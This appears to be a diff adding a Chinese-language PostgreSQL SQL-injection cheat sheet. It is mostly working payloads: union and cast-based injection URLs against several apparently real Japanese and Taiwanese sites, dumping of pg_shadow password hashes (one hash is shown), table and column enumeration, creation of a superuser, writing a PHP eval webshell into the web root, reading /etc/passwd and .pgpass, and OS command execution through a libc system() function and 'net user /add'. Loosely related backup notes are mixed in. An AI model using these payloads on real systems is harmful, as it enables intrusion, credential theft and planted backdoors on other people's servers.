@@ -1,0 +1,190 @@
+' and chr(97)%7c%7cchr(97)=chr(97)%7c%7cchr(97)--
+http://tendai.or.jp/journal/kiji.php?nid=98
+http://heiankyo.co.jp/shopping/note.php?pid=1163569' and 1=cast((select relname from pg_stat_user_tables limit 1 offset 1)||111 as int);--
+判断postgresql数据库
+http://www.xxx.com/news.php?id=62 and 1::int=1
+用户：current_user:postgres
+数据库名：current_database()或datname :kmttpweb
+当前会话用户：session_user： postgres
+用户权限：current_schema() ：pulic
+
+
+
+xxx.php?id=10;CREATE FUNCTION id() RETURNS text AS $aaa$open(FD,chr(108).chr(105).chr(32).chr(124));return join(chr(0),<FD>);$aaa$ LANGUAGE plperlu;--
+
+xxx.php?id=10 and 1=2 union select null,null,null,id(),null,null,null,null--
+
+select rolname,rolpassword from pg_authid; 获取用户名和hash(需要postgres用户权限)
+select usename,passwd from pg_shadow;同上
+http://www.kmttp.org.tw/kmt/news/news_im_context.jsp?nid=161210171300' and 1=2 uNion sELect '1111','222','333',null,'555','666','777','888',passwd,'000','rrr'from pg_shadow --
+md53175bce1d3201d16594cebf9d7eb3f9d postgrespostgres 
+
+爆表名：
+第一个表:  表名是：aclinkd
+http://www.kmttp.org.tw/kmt/news/news_im_context.jsp?nid=161210171300' and 1=2 uNion sELect '1111','222','333',null,'555','666','777','888',relname,'000','rrr' from pg_stat_user_tables limit 1 offset 0--
+或(加入relkind=’r’,只查询普通表)
+http://www.bug.cx/detail.php?id=236+and+1=2+union+select+1,null,relname,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null+from+pg_class+where+relkind='r'+limit+1+offset+0--
+
+第二个表：
+http://www.kmttp.org.tw/kmt/news/news_im_context.jsp?nid=161210171300' and 1=2 uNion sELect '1111','222','333',null,'555','666','777','888',relname,'000','rrr' from pg_stat_user_tables limit 1 offset 1--
+
+方法二：
+http://www.kmttp.org.tw/kmt/news/news_im_context.jsp?nid=161210171300' and 1=2 uNion sELect '1111','222','333',null,'555','666','777','888',cast(count(*) as varchar(10)),'000',null from information_schema.tables --
+
+http://www.kmttp.org.tw/kmt/news/news_im_context.jsp?nid=161210171300' and 1=2 uNion sELect '1111','222','333',null,'555','666','777','888',table_mane,'000',null from information_schema.tables --
+爆字段
+
+得到某个表的oid：
+select oid from pg_class where relname='aclinkd' /*这样得到表名为xxx的oid的值*/
+
+http://www.bug.cx/detail.php?id=236+and+1=2+union+select+1,null,oid,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null+from+pg_class+where+relname='表名'+limit+1+offset+0--
+或(由于oid类型是oid,要数据类型兼容我们用cast函数强制转换成varchar类型)
+http://www.bug.cx/detail.php?id=236+and+1=2+union+select+1,null,cast(oid+as+varchar(10)),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null+from+pg_class+where+relname='表名'+limit+1+offset+0--
+
+http://www.kmttp.org.tw/kmt/news/news_im_context.jsp?nid=161210171300' and 1=2 uNion sELect '1111','222','333',null,'555','666','777','888',cast(oid+as+varchar(10)),'000','rrr' from+pg_class+where+relname='aclinkd'--  25501
+或加上：limit+1+offset+0
+
+爆字段：
+第一个字段： aclinkd第一个字段是head
+http://www.kmttp.org.tw/kmt/news/news_im_context.jsp?nid=161210171300' and 1=2 uNion sELect '1111','222','333',null,'555','666','777','888',column_name,'000','rrr' from information_schema.columns where table_name='aclinkd' limit 1 offset 0--
+或(利用对应表名为xxx的oid值)
+http://www.bug.cx/detail.php?id=236+and+1=2+union+select+1,null,attname,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,null,null,null,null,null,null+from+pg_attribute+where+attrelid=oid值+limit+1+offset+0–
+前6个都是系统自带的,分别是tableoid、cmax、xmax、cmin、xmin、ctid*/
+
+第二个字段：
+http://www.kmttp.org.tw/kmt/news/news_im_context.jsp?nid=161210171300' and 1=2 uNion sELect '1111','222','333',null,'555','666','777','888',column_name,'000','rrr' from information_schema.columns where table_name='aclinkd' limit 1 offset 1--
+
+爆字段内容：
+http://www.kmttp.org.tw/kmt/news/news_im_context.jsp?nid=161210171300' and 1=2 uNion sELect '1111','222','333',null,'555','666','777','888',head,'000','rrr' from 表名aclinkd limit 1 offset 0--
+
+/*如果账户是postgres*/
+新建一个用户为pg5yl8密码为pg5yl8
+;create+user+pg5yl8+with+superuser+password+'pg5yl8'--
+ps：这是新建系统账户pg5yl8，如果有3389就可以直接用户pg5yl8密码pg5yl8登陆
+修改postgres的用户密码为pg5yl8
+;alter+user+postgres+with+password+'pg5yl8'--
+ps：这是修改系统账户postgres的密码，如果有3389就可以直接用户postgres密码pg5yl8登陆
+
+/*遍历PG当前数据库中的全部表*/
+select+tablename+from+pg_tables+where+tablename+not+like+'pg%'+and+tablename+not+like+'sql_%'+order+by+tablename--
+
+
+/*如何获得webshell*/
+http://127.0.0.1/postgresql.php?id=1;create table pg5yl8_shell(shell text not null);
+http://127.0.0.1/postgresql.php?id=1;insert into pg5yl8_shell  values ('<?php eval($_POST[r]);?>');
+http://127.0.0.1/postgresql.php?id=1;copy pg5yl8_shell(shell) to '/var/www/html/pg5yl8.php';
+另一种简便的方法：
+copy (select '<?php eval($_POST[r]);?>') to '/var/www/html/pg5yl8.php'
+
+/*如何读文件*/
+http://127.0.0.1/postgresql.php?id=1;create table pg5yl8_file(file text not null);
+http://127.0.0.1/postgresql.php?id=1;copy pg5yl8_file(file) from '/etc/passwd';
+http://127.0.0.1/postgresql.php?id=1;select * from pg5yl8_file;
+读取文件前20行
+pg_read_file('/etc/passwd',1,20)
+
+/*pgadmin的帐户信息*/
+在linux下默认存放在用户家目录的.pgpass 文件中 
+cat .pgpass
+
+/*从PostgreSQL 8.2后加入了*/
+pg_file_write(filename,text,bool)   bool为覆盖模式
+pg_read_file(filename,pos,length) 返回类型text不提，很好利用，不管是cast暴值还是union
+pg_ls_dir(dirname)
+注意他的返回类型为setof text 需要这样来(select pg_ls_dir('/var/www/') limit 1 offset n)这样来读取不同记录
+pg_stat_file(filename)   这个返回结果是record，为文件属性，需要把他作为一个子表来看待。不太清楚具体的返回字段。有兴趣的同学自己看看。另外像pg_file_unlink,pg_file_raname不提
+
+/*单引号的绕过*/
+单引号的绕过在pg8.0以上容易实现。这部分来源于老外的文档。大致意思可以用$quote$代替单引号，也可以用$$来定义字符。比如'test'变成$quote$test$quote$或$$test$$。这样对php的注入就大为方便了
+
+版本大于8
+创建一个system的函数：
+create FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT
+创建一个输出表：
+create table stdout(id serial, system_out text)
+执行shell，输出到输出表内：
+select system('uname -a > /tmp/test')
+copy 输出的内容到表里面；
+COPY stdout(system_out) FROM '/tmp/test'
+从输出表内读取执行后的回显，判断是否执行成功
+union all select NULL,(select stdout from system_out order by id desc),NULL limit 1 offset 1–-
+
+
+备份数据命令:pg_dump -O -h localhost -U 用户名 数据库名 > 备份文件名
+还原数据命令: psql -h localhost -U 用户名 -d 数据库名 < 备份的文件名
+具体步骤：
+1 本机上通过远程桌面访问到168.192.0.5(开始—运行 输入“\\168.192.0.5”)
+2 比方说我们要把postgresql里的mdb数据库备份下 那么在上一步进入的命令行状态下 输入
+“pg_dump -O -h 168.192.0.5 -U postgres mdb >c:\mdb.sql”
+注意：此语句里的“-o”必需是大写字母 否则不能识别
+pg_dump -O -h 192.168.0.5 -U dbowner -w -p 5432 SS >SS.sql 这个是备份数据库
+以上是把在服务器端的mdb数据库备份到本地c盘下面 这是会看到本机c盘下面有一个名称为mdb 的sql文件 这个文件就是服务器端postgresql里的mdb数据库里的数据表文件
+这样就实现了数据的备份功能了
+3 我们再把这个数据库导入到postgressql里面去 因为很多时候我们可能误操作删除了数据库 这时候数据的还原就显得很有必要了
+这一步也是一个命令行就可以搞定的了 输入“psql -h localhost -U postgres -d mdb 这样就把以前备份过的数据库还原到了本机上的数据库里了
+
+方法二：
+通过cast类型转换来暴postgresql信息
+http://www.xxx.com/new.php?id=1 and 1=cast(version() as int)
+
+Warning: pg_exec() [function.pg-exec]: Query failed: ERROR: invalid
+input syntax for integer: "PostgreSQL 8.2.9 on
+i386-portbld-freebsd6.3, compiled by GCC cc (GCC) 3.4.6 [FreeBSD]
+20060305" in /usr/local/www/apache22/data/qzx/news.php on line 6
+
+http://www.xxx.com/new.php?id=1 and 1=cast(current_user as int)
+
+如果遇到此类的出错信息
+Warning: pg_exec() [function.pg-exec]: Query failed: ERROR: cannot
+cast type name to integer in /usr/local/www/apache22/data/qzx/news.php
+on line 6
+
+则
+http://www.xxx.com/new.php?id=1 and 1=cast(current_user ||123 as int)
+
+Warning: pg_exec() [function.pg-exec]: Query failed: ERROR: invalid
+input syntax for integer: "zhangfeng123" in
+/usr/local/www/apache22/data/qzx/homehs.php on line 109
+
+
+
+select version() 判断版本
+select current_database(); 当前数据库
+select session_user/current_user; 会话用户
+inet_server_addr();数据库服务器的ip
+inet_server_port(); 数据库服务器的端口
+pg_stat_user_tables 存放系统所有表名的试图,关键字段relname,使用select relname from pg_stat_user_tables limit 1 offset 0 就可以读取到第一个表名.
+select column_name from information_schema.columns where table_name='xxx' limit 1 offset n 这样就可以读取每个表名的字段.(需要在information_schema模式没有删除的情况下)
+
+adminpack 包中的pg_logdir_ls()、pg_ls_dir()、pg_file_rename()、pg_file_write()、 pg_file_read()、pg_file_length()函数都限制在../postgresql/data目录下(之前2月30在文中提到目录 没权限的可能原因就是函数都限制在data目录下了)
+
+pg_logdir_ls()：select pg_logdir_ls(); 列../postgresql/data/pg_log/目录
+
+pg_file_read(text,bigint,bigint):select pg_file_read('pg_hba.conf',1,pg_file_length('pg_hb.conf')); 读取../postgresql/data/pg_hba.conf的内容
+
+
+select pg_ls_dir(text):select pg_ls_dir('pg_log/');   列../postgresql/data/pg_log/目录
+
+select pg_file_rename('pg_hba.conf','fuck.conf'); 把pg_hba.conf文件名改成fuck.conf
+
+select pg_file_write('fuck.txt','postgresql',true); 这样就在./postgresql/data目录下新建一个fuck.txt内容是postgresql
+
+如果是在开始--程序--运行psql的话,select '<?php phpinfo(); ?>'; \g 1.php这样的话,1.php是写在../postgresql/script/目录下
+---------------------------------------------------------------------------------------------------------------------------------------------
+登 陆pgsql后,运行\! net user killer 123123 /add这样就可以添加个用户,就是说可以执行系统命令,select \!^<?php phpinfo(); ?^> >>c:\\1.php 这样是可以成功在c盘里写个shell的。
+
+--------------------------------------------------------------------------------------------------------------
+psql跨库查询目前没什么办法可以突破,只有在登录sql shell而且用户是有权限的情况下,才可以进行跨库查询
+
+
+PGADMIN的帐户信息，在linux下默认存放在用户家目录的.pgpass文件中
+mickey@pentest:~$ pwd
+/home/mickey
+mickey@pentest:~$ cat .pgpass
+127.0.0.1:5432:*:postgres:mickey
+
+
+
+
+跨库：and schemaname =库名
+ \d pg_stat_user_tables;          View "pg_catalog.pg_stat_user_tables"      Column      |           Type           | Modifiers ------------------+--------------------------+----------- relid            | oid                      |  schemaname       | name                     |  relname          | name                     |  seq_scan         | bigint                   |  seq_tup_read     | bigint                   
